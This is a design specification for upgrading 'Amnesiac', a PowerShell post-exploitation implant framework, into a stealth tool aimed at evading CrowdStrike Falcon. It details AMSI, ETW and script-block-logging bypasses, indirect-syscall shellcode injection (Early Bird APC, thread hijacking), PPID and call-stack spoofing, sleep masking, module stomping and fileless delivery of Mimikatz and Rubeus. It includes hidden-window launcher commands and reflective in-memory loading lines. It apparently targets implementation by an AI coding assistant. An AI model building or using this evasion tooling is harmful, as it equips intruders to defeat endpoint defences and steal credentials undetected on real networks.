# Amnesiac Stealth Overhaul — Design Spec (Revised)
**Date:** 2026-05-23  
**Revision:** v2 — Extended bypass catalog, modular payload builder, extended AmnesiacLoader  
**Status:** Approved — pending implementation  
**Author:** Red Team Operator  

---

## 1. Objective

Extend Amnesiac into a red-team-grade post-exploitation framework that:
- Operates with zero disk writes on targets by default
- Evades CrowdStrike Falcon behavioral, memory, and ETW/AMSI detection
- Works from both non-domain-joined and domain-joined operator machines
- Delivers all tool modules over the named-pipe channel or operator HTTP server
- Generates payloads with selectable, composable evasion technique profiles

All existing Amnesiac commands and sessions remain fully functional.

---

## 2. Operational Scenarios

### Scenario 1 — Non-Domain-Joined Operator Machine
- Operator runs Amnesiac on a machine not joined to the target domain
- Domain credentials provided via `runas /netonly /user:DOMAIN\user powershell.exe`
- Has remote access or command execution on a target
- Generates payload → executes on target → gets named-pipe session back
- All target-side operation is in memory only

### Scenario 2 — Assumed Breach (Domain-Joined Operator Machine)
- Operator machine is domain-joined to the target environment
- Runs Amnesiac natively with domain token
- Enumerates and exploits across the network
- When a new target is compromised, applies Scenario 1 approach for lateral movement

Both scenarios share the same payload generation, tool delivery, and session management code paths.

---

## 3. Architecture Overview

Five layers. All changes in `Amnesiac.ps1` except where new source files are noted.

```
Amnesiac.ps1 (modified)
│
├── LAYER 0 — Bypass Library (NEW)
│   Catalog of selectable AMSI/ETW bypass implementations.
│   Each technique is a self-contained PS snippet or C# method.
│   Payload builder pulls from this catalog based on operator config.
│
├── LAYER 1 — Disk Elimination
│   Removes all automatic disk writes on operator and target machines.
│
├── LAYER 2 — Payload Assembly Engine (REVISED)
│   Replaces single stealth format with a modular builder.
│   Operator configures AMSI method, ETW method, launcher, encoding,
│   jitter profile, obfuscation level. Builder assembles to order.
│
├── LAYER 3 — In-Memory Tool Delivery
│   Operator HTTP server as primary. GitHub preserved as optional fallback.
│   Binary tools delivered over pipe, loaded via Reflection.Assembly.
│
└── LAYER 4 — Operational Guardrails
    Engagement profiles, runas/netonly detection, AES pipe encryption,
    env keying, startup OPSEC banner, session-unique protocol markers.

AmnesiacLoader/ (new C# assembly)
├── Loader.cs       — injection engine (multiple techniques)
├── Bypass.cs       — AMSI/ETW bypass from C# (new)
├── CallStack.cs    — call stack frame spoofing
├── SleepMask.cs    — memory encryption during sleep
├── UnmanagedPS.cs  — CLR hosting: run PS in non-powershell processes (new)
├── Stomper.cs      — module stomping for self-hiding (new)
├── AmnesiacLoader.csproj
└── Build.ps1       — compile → base64 → embed in Amnesiac.ps1
```

---

## 4. Layer 0 — Bypass Technique Catalog

A catalog of independently tested bypass implementations. Techniques are decoupled from payload format. The payload builder composes them. New techniques can be added without touching the builder.

### 4.1 AMSI Bypass Techniques

| Name | Mechanism | CS detection risk |
|------|-----------|-------------------|
| `pageguard` | Set PAGE_GUARD on `AmsiScanBuffer` page in amsi.dll. Register VEH that catches `STATUS_GUARD_PAGE_VIOLATION`, sets return value to `AMSI_RESULT_CLEAN` (1), restores PAGE_GUARD, continues execution. No byte modification of the function. | Low |
| `hwbp` | Set hardware breakpoint (DR0) on `AmsiScanBuffer` entry. Register VEH that catches `EXCEPTION_SINGLE_STEP`, sets RAX=0 (AMSI_RESULT_CLEAN), advances RIP past return check. Zero memory modification. Requires re-arm per new thread. | Low–medium |
| `fail` | Set `_amsiInitFailed` field in AMSI context to `true` via reflection, preventing AMSI context initialization. | Medium |
| `direct` | Overwrite first bytes of `AmsiScanBuffer` with `xor eax,eax; ret`. Detectable by integrity-checking memory scanners. | High |

**Default: `pageguard`** — borrowed from amsi-pageguard-veh technique. Hardest to detect because function bytes are unmodified.

**Reference implementations:**
- PS fallback (Layers 0–2): Pure PowerShell via P/Invoke for VEH registration and VirtualProtect
- C# primary (when AmnesiacLoader available): `AmnesiacLoader.Bypass` class (more reliable, less PS-patterned)

### 4.2 ETW Bypass Techniques

| Name | Mechanism |
|------|-----------|
| `provider` | Disable `PSEtwLogProvider` via reflection — sets `m_enabled` field to 0. PS-specific. Current implementation. |
| `patch` | Patch `EtwEventWrite` in ntdll.dll to return immediately (`xor eax,eax; ret`). Kills all userland ETW from the process. Broader but more detectable. |
| `thread` | Set per-thread ETW disable flag via undocumented TEB field. Narrower scope, lower visibility than process-wide patch. |

**Default payload ETW: `provider`** (lightweight, PS-specific).  
**Default tool execution ETW: `patch`** (broader coverage when AmnesiacLoader is delivering heavy modules).

### 4.3 SBL Bypass

Single technique: set `ScriptBlock.checkScriptBlockLoggingCache` field to `false` via reflection. No alternatives needed.

---

## 5. Layer 1 — Disk Elimination

### 5.1 Problem

Amnesiac unconditionally creates `C:\Users\Public\Documents\Amnesiac\` with eight subfolders at startup (Amnesiac.ps1 lines 60–63). Throughout a session it writes tool scripts, keylogger output, screenshots, downloaded files, clipboard data, TGT data, command history, and generated `.exe` payloads to this tree. On targets, tool modules are downloaded from GitHub to `Scripts\`.

### 5.2 Changes

**Startup — conditional folder creation**

```powershell
$global:DiskMode = $false   # default: no disk writes

function Initialize-DiskStructure {
    if(-not $global:DiskMode){ return }
    $basePath = "C:\Users\Public\Documents\Amnesiac"
    $subfolders = @("Clipboard","Downloads","History","Keylogger","Payloads","Screenshots","Scripts","Monitor_TGTs")
    if(-not (Test-Path $basePath)){ New-Item -Path $basePath -ItemType Directory > $null }
    $subfolders | ForEach-Object {
        $p = Join-Path $basePath $_
        if(-not (Test-Path $p)){ New-Item -Path $p -ItemType Directory > $null }
    }
}
Initialize-DiskStructure
```

**`diskmode` command:**
```
diskmode          — show current state
diskmode on       — enable disk writes
diskmode off      — disable disk writes (default)
```

**In-memory artifact store:**
```powershell
$global:AmnesiacArtifacts = @{
    Keylogger   = [System.Collections.Generic.List[string]]::new()
    Screenshots = [System.Collections.Generic.List[byte[]]]::new()
    Downloads   = @{}
    Clipboard   = [System.Collections.Generic.List[string]]::new()
    TGTs        = [System.Collections.Generic.List[string]]::new()
}
```

**Artifact session commands:**
```
artifacts               — list captured artifacts in memory
artifacts keylogger     — display keylogger output
save <type> [path]      — write specific artifact type to operator disk
save all                — dump all artifacts to operator disk
```

**exe payload format:** requires disk write. When `diskmode off`, warn and block:
```
 [!] exe format requires a disk write. Enable diskmode or switch format.
```

---

## 6. Layer 2 — Payload Assembly Engine

### 6.1 Overview

Replaces the single `stealth` format with a configured modular builder. `toggle` remains as a shortcut to cycle `payload encoding`. All other payload properties are configured via `payload` subcommands. The builder composes bypass snippets from Layer 0 into a single script, then applies the selected encoding.

### 6.2 Operator Commands

```
payload                         — show current payload configuration
payload amsi [pageguard|hwbp|fail|direct]
payload etw  [provider|patch|thread]
payload launcher [ps|wmi|schtask|com]
payload encoding [gzip|b64|raw|pwraw]
payload jitter [off|low|medium|high]
payload obfuscation [low|medium|high]
payload key [hostname|domain|user] <value>
payload key clear
payload key show
payload reset                   — restore all defaults
```

`toggle` → cycles `payload encoding` in sequence (b64 → raw → pwraw → gzip → stealth-default).

### 6.3 Default Profile

```
AMSI bypass:     pageguard
ETW bypass:      provider
SBL bypass:      on
Launcher:        ps
Encoding:        gzip
Jitter:          medium (1–5s random sleep)
Obfuscation:     high
Environment key: none
```

### 6.4 Payload Construction Order

1. **Header block** — load System.Core assembly
2. **ETW bypass block** — selected from Layer 0 catalog
3. **SBL bypass block** — always included
4. **AMSI bypass block** — selected from Layer 0 catalog; if AmnesiacLoader available, calls `[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()` (or hwbp variant) before pipe setup; otherwise uses PS-only P/Invoke implementation
5. **Jitter block** — random sleep per selected profile
6. **Environment key checks** — abort conditions (if keys configured)
7. **Pipe setup block** — with obfuscation applied, type names split, session-unique EndMarker and BufferSize baked in
8. **Pipe loop block** — command receive/execute/send cycle
9. **Gzip+base64 encoding** — entire script compressed; decompressor wrapper with mixed-case method names
10. **Launcher wrapping** — selected launcher wraps the encoded payload

### 6.5 Obfuscation Levels

| Level | Variable name length | Type-name split parts | Extra concat noise |
|-------|---------------------|----------------------|--------------------|
| `low` | 4–6 chars | 2 parts | None |
| `medium` | 6–10 chars | 3 parts | Occasional string ops |
| `high` | 12–20 chars | 4–6 parts | Additional concat and char array construction |

### 6.6 Session-Unique Protocol Markers

Generated once at Amnesiac startup, baked into all generated payloads:

```powershell
$global:EndMarker  = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
$global:BufferSize = @(512, 1024, 2048, 4096) | Get-Random
```

`#END#` and 1028 no longer appear in any generated payload.

### 6.7 Launcher Variants

| Name | Parent process on target | Generated command |
|------|--------------------------|-------------------|
| `ps` (default) | Inherits caller | `powershell.exe -ep bypass -Window Hidden -c "..."` |
| `wmi` | `WmiPrvSE.exe` | `wmic process call create "powershell -ep bypass ..."` |
| `schtask` | `svchost.exe` (Task Scheduler) | `schtasks /create` → `/run` → `/delete` (self-deleting one-shot) |
| `com` | `mmc.exe` | `MMC20.Application.Document.ActiveView.ExecuteShellCommand(...)` |

### 6.8 AmnesiacLoader and Payload Delivery

**AmnesiacLoader is NOT embedded in generated payloads.** Embedding a full .NET DLL (~100KB+) in every payload would make payloads large and conspicuous. The payload itself always uses the PS-level AMSI bypass from Layer 0.

AmnesiacLoader is delivered to the target *after* a session is established, on demand:

1. Operator types `load loader` (or it is sent automatically when `Migrate` is invoked)
2. Amnesiac sends the AmnesiacLoader base64 blob over the existing named pipe
3. Target session executes: `[Reflection.Assembly]::Load([Convert]::FromBase64String($loaderB64)) | Out-Null`
4. `Stomper.StompAndLoad()` is called immediately after to hide the assembly in backed memory
5. All subsequent `Migrate`, `PInject`, and bypass commands on that session use AmnesiacLoader

The operator-side `$AmnesiacLoaderB64` constant in `Amnesiac.ps1` exists solely as the source to send to targets — it is never loaded on the operator machine.

---

## 7. AmnesiacLoader — C# Assembly (Extended)

### 7.1 Project Structure

```
AmnesiacLoader/
├── Loader.cs       — injection engine
├── Bypass.cs       — AMSI/ETW bypass methods
├── CallStack.cs    — call stack spoofing
├── SleepMask.cs    — sleep masking
├── UnmanagedPS.cs  — CLR hosting (run PS in arbitrary process)
├── Stomper.cs      — module stomping (self-hiding)
└── AmnesiacLoader.csproj
```

**Project file:**
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net462</TargetFramework>
    <AssemblyName>AmnesiacLoader</AssemblyName>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <Optimize>true</Optimize>
    <DebugType>none</DebugType>
    <Nullable>disable</Nullable>
  </PropertyGroup>
</Project>
```

### 7.2 SSN Resolution — Hell's Gate + Halo's Gate

Handles both clean and EDR-hooked ntdll without disk reads:

1. Walk ntdll.dll EAT at runtime to enumerate all exports
2. For each syscall stub, check first bytes:
   - `4C 8B D1 B8 XX 00 00 00` (standard prelude, unhooked) → extract SSN from bytes 4–5
   - First bytes differ (EDR hook, e.g. `E9 XX XX XX XX` JMP) → scan neighboring syscall stubs at ±1 offset to derive SSN by sequential numbering
3. Cache resolved SSNs in a static dictionary for reuse

**Syscalls resolved and used:**
- `NtAllocateVirtualMemory` — allocate in target process
- `NtWriteVirtualMemory` — write shellcode to target
- `NtProtectVirtualMemory` — set page permissions
- `NtOpenProcess` — open handle to target
- `NtCreateThreadEx` — create remote thread
- `NtQueueApcThread` — queue APC for Early Bird injection
- `NtResumeThread` — resume suspended thread
- `NtSuspendThread` — suspend thread for hijacking
- `NtGetContextThread` / `NtSetContextThread` — thread context manipulation

### 7.3 Injection Techniques (`Loader.cs`)

**Public API:**

```csharp
namespace AmnesiacLoader {
    public class Injector {
        // Inject shellcode into existing process via thread hijacking (indirect syscalls)
        public static bool InjectShellcode(int pid, byte[] shellcode);

        // Spawn new process with PPID spoofed to spoofParentPid, inject via Early Bird APC
        public static bool InjectNewProcess(string processPath, byte[] shellcode, int spoofParentPid);

        // CLR hosting: load PS runtime inside target process, run psScript without powershell.exe
        public static bool InjectUnmanagedPS(int pid, string psScript);

        // Spawn new process with PPID spoof, CLR hosting inside it
        public static bool SpawnUnmanagedPS(string processPath, string psScript, int spoofParentPid);
    }
}
```

**Early Bird APC injection flow (`InjectNewProcess`):**
1. `CreateProcessW` with `EXTENDED_STARTUPINFO_PRESENT` flag and `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` set to `spoofParentPid` — PPID spoofed in process creation record
2. `NtAllocateVirtualMemory` — allocate RW region in new process
3. `NtWriteVirtualMemory` — write shellcode
4. `NtProtectVirtualMemory` — change to RX
5. `NtQueueApcThread` — queue APC to suspended main thread pointing at shellcode
6. `NtResumeThread` — APC fires before any user code runs

**Thread hijacking flow (`InjectShellcode`):**
1. `NtOpenProcess` — open target with appropriate access
2. `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory`
3. `NtSuspendThread` on a target thread (prefer threads in wait state)
4. `NtGetContextThread` — save full context
5. `NtSetContextThread` — redirect RIP to shellcode, set up return trampoline
6. `NtResumeThread`

**CLR hosting (`InjectUnmanagedPS`):**
1. Inject shellcode stub into target via Early Bird APC (shellcode calls `CoInitializeEx` + `CorBindToRuntimeEx`)
2. Stub creates `ICorRuntimeHost`, starts runtime, creates `AppDomain`
3. Loads `System.Management.Automation.dll` reflectively into the domain
4. Creates `Runspace`, pipes `psScript` (the Amnesiac named-pipe client script) as a command
5. Invokes — target process now runs the PS implant with no `powershell.exe` anywhere in the tree

**PPID spoofing default:** `explorer.exe` PID (obtained by enumerating running processes). Configurable.

**Call stack spoofing** (`CallStack.cs`) is invoked before each `NtXxx` dispatch: inserts synthetic ROP frames sourced from `ntdll.dll` and `kernelbase.dll` gadgets so the call stack shows a legitimate `ntdll → kernelbase → kernel32` origin.

### 7.4 Bypass Methods (`Bypass.cs`)

```csharp
namespace AmnesiacLoader {
    public class Bypass {
        // PAGE_GUARD + VEH on AmsiScanBuffer — no byte modification
        public static void PatchAmsiPageGuard();

        // Hardware breakpoint (DR0) on AmsiScanBuffer + VEH
        public static void PatchAmsiHardwareBreakpoint();

        // Patch EtwEventWrite in ntdll to ret 0 — kills all userland ETW
        public static void PatchEtwEventWrite();
    }
}
```

**`PatchAmsiPageGuard` implementation detail:**
1. `GetProcAddress(amsi.dll, "AmsiScanBuffer")` — get function address
2. `VirtualProtect(addr, 1, PAGE_GUARD | PAGE_EXECUTE_READ, out old)` — apply guard
3. `AddVectoredExceptionHandler` with handler that:
   - Checks `ExceptionCode == STATUS_GUARD_PAGE_VIOLATION` and `ExceptionAddress == AmsiScanBuffer`
   - Sets `ContextRecord.Rax = 1` (AMSI_RESULT_CLEAN)
   - Sets `ContextRecord.Rip` past the scan — skips to return
   - Returns `EXCEPTION_CONTINUE_EXECUTION`

**`PatchAmsiHardwareBreakpoint` implementation detail:**
1. Get `AmsiScanBuffer` address
2. Set `DR0 = addr`, `DR7 |= (1 << 0)` — enable local hardware breakpoint on thread
3. Register VEH catching `EXCEPTION_SINGLE_STEP` at `DR0`:
   - Set `Rax = 1`
   - Clear `DR6` status bits
   - Return `EXCEPTION_CONTINUE_EXECUTION`

### 7.5 Sleep Masking (`SleepMask.cs`)

```csharp
public class SleepMask {
    // Encrypt regionBase..regionBase+regionSize with AES-128, mark PAGE_NOACCESS, sleep, restore
    public static void MaskedSleep(int milliseconds, IntPtr regionBase, int regionSize);
}
```

Implementation:
1. Generate random AES-128 key, store in separate non-executable page
2. `VirtualProtect(regionBase, regionSize, PAGE_READWRITE)` — make region writable for encryption
3. AES-128 CBC encrypt region in-place
4. `VirtualProtect(regionBase, regionSize, PAGE_NOACCESS)` — scanner finds nothing
5. `Sleep(milliseconds)`
6. `VirtualProtect` → RX, AES decrypt in-place
7. Zero and free the key page

### 7.6 Module Stomping (`Stomper.cs`)

When AmnesiacLoader is loaded on the target via `[Reflection.Assembly]::Load(bytes)`, it produces unbacked executable memory — a CS memory scanner IOC.

`Stomper` addresses this for the target-side load:
1. Enumerate loaded modules in the current process
2. Find a non-critical loaded DLL with a `.text` section of sufficient size (≥ AmnesiacLoader DLL size)
3. `VirtualProtect` that section to RW
4. Copy AmnesiacLoader PE bytes into the section
5. Fix up the in-memory PE headers (relocations, imports) for the new base address
6. Invoke `Stomper.StompAndLoad()` from the PS payload before any other AmnesiacLoader call

```csharp
public class Stomper {
    // Overwrite a loaded DLL's PE header in memory with the AmnesiacLoader header,
    // making the memory scanner see a file-backed mapping instead of anonymous allocation.
    // Note: execution still happens from the original CLR-allocated memory;
    // this is header spoofing, not true code relocation.
    public static void ConcealLoadedAssembly(Assembly asm, string targetDllName = null);
}
```

**Bootstrapping sequence** (no chicken-and-egg): `[Reflection.Assembly]::Load(bytes)` loads AmnesiacLoader into unbacked memory briefly. `Stomper.ConcealLoadedAssembly()` is the first method called after load — it overwrites the in-memory PE header of the just-loaded assembly with the header of a legitimate DLL, changing what the scanner sees from "anonymous" to "backed." The window of exposure is microseconds.

### 7.7 `Migrate` Command Interface (updated)

```
Migrate <pid>              — thread hijack existing process, inject PS implant
Migrate new <proc>         — spawn <proc> with PPID spoofed to explorer.exe, Early Bird APC
Migrate ps <pid>           — CLR hosting in target PID (no powershell.exe in process tree)
Migrate ps new <proc>      — spawn <proc>, CLR hosting inside it, PPID spoofed
```

### 7.8 Delivery and Loading Flow

**Operator side (`Amnesiac.ps1`):**
```powershell
# Base64 constant at top of Amnesiac.ps1 — updated by Build.ps1
$AmnesiacLoaderB64 = "<base64 string>"
```
This constant is never loaded in the operator's PS process. It exists to be sent to target sessions.

**Target side (via named pipe):**

When `Migrate` or `load loader` is invoked, `Send-Module` delivers AmnesiacLoader over the pipe using the standard module framing protocol. The target PS session executes two sequential commands:

```powershell
# Step 1 — load assembly (briefly unbacked)
$_la = [Reflection.Assembly]::Load([Convert]::FromBase64String('<loader_b64>'))
# Step 2 — conceal header immediately (scanner sees backed memory)
[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)
```

After step 2, all AmnesiacLoader classes are available for subsequent session commands. The assembly's in-memory PE header is overwritten to appear as a legitimate loaded DLL.

---

## 8. Layer 3 — In-Memory Tool Delivery

### 8.1 Tool Cache Architecture

```powershell
$global:ToolCache = @{}   # toolname -> script content

function Initialize-ToolCache {
    # Priority 1: embedded gzip+base64 constants in Amnesiac.ps1
    # Priority 2: local Tools\ directory
    # Priority 3: operator HTTP server (on demand via 'serve')
    # Priority 4: GitHub (optional fallback — preserved, not blocked)
}
```

### 8.2 Tool Tiers

| Tier | Tools | Storage |
|------|-------|---------|
| Core (always) | SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess | Embedded gzip+base64 constants in Amnesiac.ps1 |
| Standard | PowerView, Invoke-SessionHunter, PassSpray, Validate-Credentials, Ask4Creds, Invoke-Patamenia, TGT_Monitor, HiveDump, dumper, klg, cms, Tkn_Access_Check | Local `Tools\` at startup |
| Heavy | Suntour (Mimikatz), Ferrari (Rubeus), ppl, TermsrvPatcher, RDPKeylog.exe | Operator HTTP server on demand |

### 8.3 GitHub Fallback Behaviour

GitHub is preserved as an optional fallback. When a tool is not in the local cache:
```
 [~] 'PowerView' not in local cache — falling back to GitHub.
     Pre-cache with 'modules reload' before live engagements.
```

`$global:ServerURL` defaults to `http://<operator-IP>:8080`. Can be overridden with `RepoURL <url>`.

### 8.4 In-Pipe Module Delivery

`Send-Module` streams tool source over the named pipe. Framing protocol (sent as regular pipe commands to the target):

1. Operator side sends: `__MODULE_BEGIN__:<name>:<total_length>\n`
2. Followed by chunks: `__MODULE_CHUNK__:<base64_chunk>\n` (4KB each)
3. End: `__MODULE_END__:<name>\n`

Target assembles chunks, reconstructs source, executes via `[scriptblock]::Create($source).Invoke()`. For PS script modules: plain text reassembly. For binary (.NET) modules: base64-decode the assembled data → `[Reflection.Assembly]::Load()`.

AmnesiacLoader's `Bypass.PatchAmsiPageGuard()` is called on the target before loading any binary modules (sent as a preceding command in the pipe session).

### 8.5 New `modules` Commands

```
modules              — list tools with cache status (core/standard/heavy/missing)
modules reload       — re-scan Tools\ and refresh cache
modules status       — show embedded / local / remote breakdown
```

---

## 9. Layer 4 — Operational Guardrails

### 9.1 Engagement Profiles

```
engagement                  — show current profile
engagement nondomained      — Scenario 1: non-domain-joined operator
engagement domained         — Scenario 2: domain-joined assumed breach
engagement reset            — clear profile
```

| Setting | `nondomained` | `domained` |
|---------|---------------|------------|
| Default listener mode | GListener | Listener or GListener |
| runas /netonly guidance | Yes | No |
| PSK default derivation | pipe name + operator IP | pipe name + machine SID |

### 9.2 runas /netonly Token Detection

```powershell
function Test-NetworkLogonToken {
    # Check for Type-9 (NewCredentials) logon session
    # Return $true if network logon token present
}
```

- Token detected: `[+] Network logon token detected [DOMAIN\username] — domain resources accessible`
- Not detected: `[!] WARNING: No network logon token detected. Launch from: runas /netonly /user:DOMAIN\user powershell.exe`

### 9.3 AES Pipe Channel Encryption

All pipe I/O encrypted with AES-128 CBC after initial handshake.

Key exchange:
1. Target generates 16-byte random session key
2. Target encrypts session key with PSK using AES-128
3. Target sends encrypted key as first pipe message
4. Operator decrypts with PSK
5. All subsequent messages use session key

```
psk <passphrase>    — set pre-shared key
psk                 — show PSK status (masked)
psk reset           — revert to derived default (SHA-256 of pipe name, first 16 bytes)
```

### 9.4 Payload Environment Keying

Managed via `payload key` subcommands (absorbed from old `key` command):

```
payload key hostname  <name>
payload key domain    <name>
payload key user      <name>
payload key clear
payload key show
```

Prepended to payload before compression. Failed checks produce silent exit — no output, no network call:
```powershell
if($env:COMPUTERNAME -ne 'WIN-TARGET01'){ exit }
if((Get-WmiObject Win32_ComputerSystem).Domain -ne 'GOAD.LOCAL'){ exit }
if($env:USERNAME -ne 'svc-sql'){ exit }
```

### 9.5 Startup OPSEC Summary Banner

```
 [+] Amnesiac vX.X — Red Team Edition
 ─────────────────────────────────────────────
 [+] Disk mode:        OFF
 [+] Engagement:       nondomained
 [+] Network token:    GOAD\Administrator
 [+] Tool cache:       17/23 modules loaded
 [+] End marker:       xK9mPqRt  (session-unique)
 [+] Buffer size:      2048 bytes
 [+] Loader:           AmnesiacLoader v1.0 (embedded)
 [+] Payload profile:  amsi=pageguard etw=provider launcher=ps encoding=gzip obfuscation=high
 [+] PSK:              configured (derived)
 ─────────────────────────────────────────────
 [!] Heavy modules not cached: Suntour, Ferrari, ppl
     Run 'serve' to enable via local HTTP server
```

---

## 10. Implementation Order

| Phase | Layer | Deliverable |
|-------|-------|-------------|
| 1 | Layer 1 | Disk elimination, diskmode, artifact store |
| 2 | Layer 4 | Engagement profiles, token detection, OPSEC banner, psk command |
| 3 | Layer 2 (partial) | Session-unique EndMarker/BufferSize, payload builder commands, AMSI bypass catalog (PS fallback), jitter/obfuscation levels |
| 4 | Layer 3 | ToolCache, Send-Module, modules command, operator HTTP server default |
| 5 | Layer 2b — Bypass.cs | AmnesiacLoader: Bypass.cs (pageguard + hwbp + EtwEventWrite patch) |
| 6 | Layer 2b — Loader.cs | AmnesiacLoader: SSN resolution (Hell's Gate + Halo's Gate), Early Bird APC, thread hijacking |
| 7 | Layer 2b — CallStack.cs | Call stack frame spoofing |
| 8 | Layer 2b — SleepMask.cs | Sleep masking |
| 9 | Layer 2b — Stomper.cs | Module stomping |
| 10 | Layer 2b — UnmanagedPS.cs | CLR hosting, Migrate ps command |

Phases 1–4 are pure PS and can be developed and tested independently.  
Phases 5–10 are C# and require `.NET SDK 6.0+` build toolchain.

---

## 11. Files Changed / Created

| File | Change type | Notes |
|------|------------|-------|
| `Amnesiac.ps1` | Modified | All layer changes; `$AmnesiacLoaderB64` constant |
| `Amnesiac_ShellReady.ps1` | Modified | Sync all changes (deferred to final phase) |
| `AmnesiacLoader/Loader.cs` | New | Multi-technique injection engine |
| `AmnesiacLoader/Bypass.cs` | New | AMSI/ETW bypass methods |
| `AmnesiacLoader/CallStack.cs` | New | Frame spoofing |
| `AmnesiacLoader/SleepMask.cs` | New | Memory encryption during sleep |
| `AmnesiacLoader/UnmanagedPS.cs` | New | CLR hosting for PS migration |
| `AmnesiacLoader/Stomper.cs` | New | Module stomping |
| `AmnesiacLoader/AmnesiacLoader.csproj` | New | .NET 4.6.2 project file |
| `AmnesiacLoader/Build.ps1` | New | Build + embed script |
| `CLAUDE.md` | Modified | Updated architecture reference |
| `CHANGELOG.md` | Modified | All changes with operational context |

---

## 12. Out of Scope

- Internet-facing C2 (DNS tunnelling, domain fronting, external callbacks)
- Persistence mechanisms (scheduled tasks, registry run keys, WMI subscriptions)
- Privilege escalation exploits
- Full modular rebuild
- Kernel-level ETW bypass (requires driver)
- CFG bypass (deferred — handle by targeting non-CFG processes initially)
- Amnesiac_ShellReady.ps1 sync (deferred to final phase)
